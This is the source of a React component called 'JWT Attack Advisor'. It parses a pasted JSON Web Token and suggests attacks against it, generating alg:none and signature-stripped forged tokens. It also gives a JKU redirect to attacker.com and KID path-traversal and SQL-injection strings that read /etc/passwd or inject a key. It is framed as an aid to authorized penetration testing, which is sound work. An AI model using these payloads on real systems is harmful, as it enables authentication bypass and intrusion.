import React, { useState } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faKey, faExclamationTriangle, faCheckCircle, faSearch, faCopy, faShieldAlt, faBug } from '@fortawesome/free-solid-svg-icons';

export type JwtAttackAdvisorData = {
  token?: string;
  header?: JwtHeader;
  payload?: Record<string, unknown>;
  attacks?: JwtAttack[];
  analyzedAt?: number;
  error?: string;
};

export type JwtHeader = {
  alg?: string;
  typ?: string;
  kid?: string;
  jku?: string;
  x5u?: string;
  x5c?: string[];
  [key: string]: unknown;
};

export type JwtAttack = {
  name: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  payload?: string;
  applicable: boolean;
  reason?: string;
};

type Props = {
  data: JwtAttackAdvisorData | undefined;
  onChange: (data: JwtAttackAdvisorData) => void;
};

const base64UrlDecode = (str: string): string => {
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  const padding = base64.length % 4;
  if (padding) {
    base64 += '='.repeat(4 - padding);
  }
  return atob(base64);
};

const base64UrlEncode = (str: string): string => {
  return btoa(str)
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
};

const analyzeJwt = (token: string): { header: JwtHeader; payload: Record<string, unknown>; attacks: JwtAttack[] } => {
  const parts = token.split('.');
  if (parts.length !== 3) {
    throw new Error('Invalid JWT format. Expected 3 parts separated by dots.');
  }

  const header = JSON.parse(base64UrlDecode(parts[0])) as JwtHeader;
  const payload = JSON.parse(base64UrlDecode(parts[1])) as Record<string, unknown>;
  const attacks: JwtAttack[] = [];

  // Algorithm None Attack
  attacks.push({
    name: 'Algorithm None Attack',
    severity: 'critical',
    description: 'Set algorithm to "none" to bypass signature verification',
    payload: generateNoneAlgToken(parts[0], parts[1]),
    applicable: true,
    reason: 'Always worth trying - many implementations are vulnerable'
  });

  // Algorithm Confusion (RS256 -> HS256)
  const isAsymmetric = header.alg?.startsWith('RS') || header.alg?.startsWith('ES') || header.alg?.startsWith('PS');
  attacks.push({
    name: 'Algorithm Confusion (RS256 to HS256)',
    severity: 'critical',
    description: 'Change RS256 to HS256 and sign with public key as secret',
    applicable: isAsymmetric ?? false,
    reason: isAsymmetric ? 'Token uses asymmetric algorithm - confusion attack may work' : 'Token already uses symmetric algorithm'
  });

  // JKU/X5U Injection
  if (header.jku) {
    attacks.push({
      name: 'JKU Header Injection',
      severity: 'critical',
      description: 'JKU header present - can be exploited to point to attacker-controlled JWKS',
      payload: `Change jku to: https://attacker.com/.well-known/jwks.json`,
      applicable: true,
      reason: `Current JKU: ${header.jku}`
    });
  }

  if (header.x5u) {
    attacks.push({
      name: 'X5U Header Injection',
      severity: 'critical',
      description: 'X5U header present - can point to attacker-controlled X.509 cert',
      applicable: true,
      reason: `Current X5U: ${header.x5u}`
    });
  }

  // KID Injection
  if (header.kid) {
    attacks.push({
      name: 'KID Path Traversal',
      severity: 'high',
      description: 'KID header present - may be vulnerable to path traversal or SQL injection',
      payload: `Try kid values: "../../../dev/null", "' OR '1'='1", "../../../../../../etc/passwd"`,
      applicable: true,
      reason: `Current KID: ${header.kid}`
    });

    attacks.push({
      name: 'KID SQL Injection',
      severity: 'high',
      description: 'If KID is used in database query, SQL injection may be possible',
      payload: `kid: "' UNION SELECT 'secret-key' --"`,
      applicable: true,
      reason: 'KID header present'
    });
  }

  // Weak Secret
  attacks.push({
    name: 'Weak Secret Brute Force',
    severity: 'high',
    description: 'HMAC-signed tokens may use weak/common secrets',
    applicable: header.alg?.startsWith('HS') ?? false,
    reason: header.alg?.startsWith('HS') ? 'Token uses HMAC - can attempt secret brute-force' : 'Not using HMAC algorithm'
  });

  // Signature Stripping
  attacks.push({
    name: 'Signature Stripping',
    severity: 'medium',
    description: 'Remove or modify signature to test verification',
    payload: `${parts[0]}.${parts[1]}.`,
    applicable: true,
    reason: 'Always test if signature is properly validated'
  });

  // Expiration Bypass
  const now = Math.floor(Date.now() / 1000);
  const exp = payload.exp as number | undefined;
  const nbf = payload.nbf as number | undefined;

  if (exp && exp < now) {
    attacks.push({
      name: 'Expired Token Replay',
      severity: 'medium',
      description: 'Token is expired - test if expiration is enforced',
      applicable: true,
      reason: `Token expired at: ${new Date(exp * 1000).toISOString()}`
    });
  }

  if (nbf && nbf > now) {
    attacks.push({
      name: 'NBF Bypass',
      severity: 'low',
      description: 'Token not yet valid - test if nbf is enforced',
      applicable: true,
      reason: `Token valid from: ${new Date(nbf * 1000).toISOString()}`
    });
  }

  // Claim Modification
  attacks.push({
    name: 'Claim Manipulation',
    severity: 'medium',
    description: 'Modify claims like role, admin, permissions without valid signature',
    applicable: true,
    reason: 'Test if claim values are validated server-side'
  });

  // JWKS Spoofing (if no jku)
  if (!header.jku && isAsymmetric) {
    attacks.push({
      name: 'Embedded JWK Attack',
      severity: 'high',
      description: 'Add jwk header with attacker-controlled key',
      applicable: true,
      reason: 'No JKU present - may accept embedded JWK'
    });
  }

  return { header, payload, attacks };
};

const generateNoneAlgToken = (headerB64: string, payloadB64: string): string => {
  try {
    const header = JSON.parse(base64UrlDecode(headerB64));
    header.alg = 'none';
    const newHeader = base64UrlEncode(JSON.stringify(header));
    return `${newHeader}.${payloadB64}.`;
  } catch {
    return 'Error generating payload';
  }
};

const JwtAttackAdvisor: React.FC<Props> = ({ data, onChange }) => {
  const token = data?.token ?? '';
  const header = data?.header;
  const payload = data?.payload;
  const attacks = data?.attacks ?? [];
  const analyzedAt = data?.analyzedAt;
  const error = data?.error ?? '';
  const [copiedItem, setCopiedItem] = useState<string | null>(null);

  const handleAnalyze = () => {
    if (!token.trim()) return;

    try {
      const result = analyzeJwt(token.trim());
      onChange({
        ...data,
        header: result.header,
        payload: result.payload,
        attacks: result.attacks,
        analyzedAt: Date.now(),
        error: ''
      });
    } catch (e) {
      onChange({
        ...data,
        error: e instanceof Error ? e.message : 'Failed to analyze JWT',
        header: undefined,
        payload: undefined,
        attacks: []
      });
    }
  };

  const handleCopy = async (text: string, name: string) => {
    await navigator.clipboard.writeText(text);
    setCopiedItem(name);
    setTimeout(() => setCopiedItem(null), 2000);
  };

  const severityColors = {
    critical: 'border-red-500/50 bg-red-900/20 text-red-400',
    high: 'border-orange-500/50 bg-orange-900/20 text-orange-400',
    medium: 'border-yellow-500/50 bg-yellow-900/20 text-yellow-400',
    low: 'border-blue-500/50 bg-blue-900/20 text-blue-400'
  };

  const applicableAttacks = attacks.filter(a => a.applicable);

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-3">
        <div className="text-xs text-slate-200">JWT Attack Advisor</div>
        <div className="flex gap-2">
          {analyzedAt && (
            <span className="text-[10px] text-slate-500">
              {new Date(analyzedAt).toLocaleTimeString()}
            </span>
          )}
        </div>
      </div>

      <div className="text-[10px] text-slate-500 mb-3">
        Analyzes JWTs and suggests attack vectors for security testing.
      </div>

      <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3">
        <div className="text-[10px] text-slate-500 mb-1">JWT Token</div>
        <textarea
          value={token}
          onChange={(e) => onChange({ ...data, token: e.target.value })}
          placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
          className="w-full rounded bg-slate-800 text-slate-200 text-[11px] px-2 py-1 border border-slate-700 focus:outline-none focus:border-purple-500 font-mono h-16 resize-none"
        />
      </div>

      <button
        onClick={handleAnalyze}
        disabled={!token.trim()}
        className="w-full rounded bg-purple-600/20 border border-purple-500/30 px-2 py-1.5 text-[11px] text-purple-300 hover:bg-purple-600/30 transition-colors disabled:opacity-50 flex items-center justify-center gap-2 mb-3"
      >
        <FontAwesomeIcon icon={faSearch} className="w-3 h-3" />
        Analyze & Suggest Attacks
      </button>

      {error && (
        <div className="text-red-400 text-[11px] bg-red-900/20 border border-red-500/30 p-2 rounded flex items-center gap-2 mb-3">
          <FontAwesomeIcon icon={faExclamationTriangle} className="w-3 h-3" />
          {error}
        </div>
      )}

      {header && (
        <div className="rounded border border-slate-700 bg-slate-800/30 p-2 mb-3 space-y-2">
          <div>
            <div className="flex items-center justify-between mb-1">
              <div className="text-[10px] text-slate-500 flex items-center gap-1">
                <FontAwesomeIcon icon={faShieldAlt} className="w-2.5 h-2.5" />
                Header
              </div>
              <button
                onClick={() => handleCopy(JSON.stringify(header, null, 2), 'header')}
                className="text-[9px] text-slate-500 hover:text-slate-300"
              >
                <FontAwesomeIcon icon={copiedItem === 'header' ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
              </button>
            </div>
            <pre className="p-1.5 bg-slate-900/50 rounded text-[10px] font-mono text-green-400 overflow-x-auto">
              {JSON.stringify(header, null, 2)}
            </pre>
          </div>

          <div>
            <div className="flex items-center justify-between mb-1">
              <div className="text-[10px] text-slate-500 flex items-center gap-1">
                <FontAwesomeIcon icon={faKey} className="w-2.5 h-2.5" />
                Payload
              </div>
              <button
                onClick={() => handleCopy(JSON.stringify(payload, null, 2), 'payload')}
                className="text-[9px] text-slate-500 hover:text-slate-300"
              >
                <FontAwesomeIcon icon={copiedItem === 'payload' ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
              </button>
            </div>
            <pre className="p-1.5 bg-slate-900/50 rounded text-[10px] font-mono text-blue-400 overflow-x-auto max-h-20">
              {JSON.stringify(payload, null, 2)}
            </pre>
          </div>
        </div>
      )}

      {applicableAttacks.length > 0 && (
        <div className="flex-1 overflow-y-auto min-h-0">
          <div className="text-[10px] text-slate-500 mb-2 flex items-center gap-1">
            <FontAwesomeIcon icon={faBug} className="w-2.5 h-2.5" />
            Suggested Attack Vectors ({applicableAttacks.length})
          </div>
          <div className="space-y-2">
            {applicableAttacks.map((attack, index) => (
              <div
                key={index}
                className={`p-2 rounded border ${severityColors[attack.severity]}`}
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="font-medium text-[11px] text-slate-200">{attack.name}</span>
                  <span className={`text-[9px] px-1.5 py-0.5 rounded ${
                    attack.severity === 'critical' ? 'bg-red-600/50' :
                    attack.severity === 'high' ? 'bg-orange-600/50' :
                    attack.severity === 'medium' ? 'bg-yellow-600/50' : 'bg-blue-600/50'
                  } text-slate-200`}>
                    {attack.severity.toUpperCase()}
                  </span>
                </div>
                <div className="text-[10px] text-slate-400 mb-1">{attack.description}</div>
                {attack.reason && (
                  <div className="text-[10px] text-slate-500">{attack.reason}</div>
                )}
                {attack.payload && (
                  <div className="mt-1 flex items-center gap-2">
                    <code className="text-[10px] bg-slate-900/50 px-1 rounded text-green-400 truncate flex-1">
                      {attack.payload.substring(0, 50)}...
                    </code>
                    <button
                      onClick={() => handleCopy(attack.payload!, attack.name)}
                      className="text-[9px] text-slate-500 hover:text-slate-300"
                    >
                      <FontAwesomeIcon icon={copiedItem === attack.name ? faCheckCircle : faCopy} className="w-2.5 h-2.5" />
                    </button>
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="text-[10px] text-slate-500 space-y-1 border-t border-slate-700 pt-2 mt-3">
        <div><strong>Algorithm Confusion:</strong> Change asymmetric to symmetric</div>
        <div><strong>None Algorithm:</strong> Bypass signature verification</div>
        <div className="text-red-400">For authorized security testing only!</div>
      </div>
    </div>
  );
};

export class JwtAttackAdvisorTool {
  static Component = JwtAttackAdvisor;
}
